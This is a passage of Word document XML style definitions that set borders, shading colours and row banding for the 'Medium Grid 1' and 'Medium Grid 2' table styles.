        <w:left w:val="single" w:sz="8" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="D9DCDF" w:themeFill="accent1" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="8C959E" w:themeColor="accent1" w:themeTint="BF"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="B2B8BE" w:themeFill="accent1" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="B2B8BE" w:themeFill="accent1" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid1-Accent2">
    <w:name w:val="Medium Grid 1 Accent 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="67"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="F6D2C7" w:themeFill="accent2" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="E47757" w:themeColor="accent2" w:themeTint="BF"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="EDA58F" w:themeFill="accent2" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="EDA58F" w:themeFill="accent2" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid1-Accent3">
    <w:name w:val="Medium Grid 1 Accent 3"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="67"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="E9E9EB" w:themeFill="accent3" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="BCBDC3" w:themeColor="accent3" w:themeTint="BF"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="D3D3D7" w:themeFill="accent3" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="D3D3D7" w:themeFill="accent3" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid1-Accent4">
    <w:name w:val="Medium Grid 1 Accent 4"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="67"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="A8F7FF" w:themeFill="accent4" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="00E2F7" w:themeColor="accent4" w:themeTint="BF"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="50F0FF" w:themeFill="accent4" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="50F0FF" w:themeFill="accent4" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid1-Accent5">
    <w:name w:val="Medium Grid 1 Accent 5"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="67"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="B7D7EC" w:themeFill="accent5" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="3185BA" w:themeColor="accent5" w:themeTint="BF"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="6EB0D9" w:themeFill="accent5" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="6EB0D9" w:themeFill="accent5" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid1-Accent6">
    <w:name w:val="Medium Grid 1 Accent 6"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="67"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
    </w:pPr>
    <w:tblPr>
      <w:tblStyleRowBandSize w:val="1"/>
      <w:tblStyleColBandSize w:val="1"/>
      <w:tblBorders>
        <w:top w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="A6EAFF" w:themeFill="accent6" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="18" w:space="0" w:color="00BAF1" w:themeColor="accent6" w:themeTint="BF"/>
        </w:tcBorders>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
      </w:rPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="4CD6FF" w:themeFill="accent6" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="4CD6FF" w:themeFill="accent6" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
  </w:style>
  <w:style w:type="table" w:styleId="MediumGrid2">
    <w:name w:val="Medium Grid 2"/>
    <w:basedOn w:val="TableNormal"/>
    <w:uiPriority w:val="68"/>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1E5272" w:themeColor="text1"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="1E5272" w:themeColor="text1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="B7D7EC" w:themeFill="text1" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2EFF7" w:themeFill="text1" w:themeFillTint="19"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="12" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E527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E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="C4DFEF" w:themeFill="text1" w:themeFillTint="33"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="6EB0D9" w:themeFill="text1" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="single" w:sz="6" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:insideV w:val="single" w:sz="6" w:space="0" w:color="1E5272" w:themeColor="text1"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="6EB0D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68727B" w:themeColor="accent1"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="68727B" w:themeColor="accent1"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="D9DCDF" w:themeFill="accent1" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="EFF1F2" w:themeFill="accent1" w:themeFillTint="19"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="12" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E527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E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="E0E2E5" w:themeFill="accent1" w:themeFillTint="33"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="B2B8BE" w:themeFill="accent1" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="single" w:sz="6" w:space="0" w:color="68727B" w:themeColor="accent1"/>
          <w:insideV w:val="single" w:sz="6" w:space="0" w:color="68727B" w:themeColor="accent1"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="B2B8B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D94D22" w:themeColor="accent2"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="F6D2C7" w:themeFill="accent2" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FBEDE8" w:themeFill="accent2" w:themeFillTint="19"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="12" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E527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E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="F8DAD2" w:themeFill="accent2" w:themeFillTint="33"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="EDA58F" w:themeFill="accent2" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="single" w:sz="6" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
          <w:insideV w:val="single" w:sz="6" w:space="0" w:color="D94D22" w:themeColor="accent2"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="EDA58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A7A8B0" w:themeColor="accent3"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="E9E9EB" w:themeFill="accent3" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F6F6F7" w:themeFill="accent3" w:themeFillTint="19"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="12" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E527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E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="EDEDEF" w:themeFill="accent3" w:themeFillTint="33"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="D3D3D7" w:themeFill="accent3" w:themeFillTint="7F"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Horz">
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:insideH w:val="single" w:sz="6" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
          <w:insideV w:val="single" w:sz="6" w:space="0" w:color="A7A8B0" w:themeColor="accent3"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="D3D3D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00929F" w:themeColor="accent4"/>
        <w:left w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:bottom w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:right w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:insideH w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
        <w:insideV w:val="single" w:sz="8" w:space="0" w:color="00929F" w:themeColor="accent4"/>
      </w:tblBorders>
    </w:tblPr>
    <w:tcPr>
      <w:shd w:val="clear" w:color="auto" w:fill="A8F7FF" w:themeFill="accent4" w:themeFillTint="3F"/>
    </w:tcPr>
    <w:tblStylePr w:type="firstRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:shd w:val="clear" w:color="auto" w:fill="DCFCFF" w:themeFill="accent4" w:themeFillTint="19"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="lastRow">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="single" w:sz="12" w:space="0" w:color="1E5272" w:themeColor="text1"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF" w:themeFill="background1"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="firstCol">
      <w:rPr>
        <w:b/>
        <w:bCs/>
        <w:color w:val="1E527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E5272" w:themeColor="text1"/>
      </w:rPr>
      <w:tblPr/>
      <w:tcPr>
        <w:tcBorders>
          <w:top w:val="nil"/>
          <w:left w:val="nil"/>
          <w:bottom w:val="nil"/>
          <w:right w:val="nil"/>
          <w:insideH w:val="nil"/>
          <w:insideV w:val="nil"/>
        </w:tcBorders>
        <w:shd w:val="clear" w:color="auto" w:fill="B8F9FF" w:themeFill="accent4" w:themeFillTint="33"/>
      </w:tcPr>
    </w:tblStylePr>
    <w:tblStylePr w:type="band1Vert">
      <w:tblPr/>
      <w:tcPr>
